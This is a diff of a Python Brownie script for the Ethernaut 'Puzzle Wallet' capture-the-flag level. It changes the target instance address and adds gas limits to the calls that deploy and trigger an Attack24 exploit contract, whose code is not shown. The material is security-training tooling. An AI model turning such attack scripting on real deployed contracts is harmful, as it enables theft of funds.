@@ -2,7 +2,7 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0xc660d2f747bD3D7070F235cE4c11138E88af7584"
+ETHERNAUT_INSTANCE = "0x5725ef854cf053d6A449D0555DCaEA2FE523C8a2"
 
 PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
 GAS_LIMIT = 6000000
@@ -64,10 +64,10 @@ def main():
     # target.addToWhitelist(player, {"from": player})
     # print_storage(player, target)
         
-    attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player})
-    attack.attack({"from": player})
+    attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player, "gas_limit": GAS_LIMIT})
+    attack.attack({"from": player, "gas_limit": GAS_LIMIT})
+    
     print_storage(player, target)
-
 
 
 """
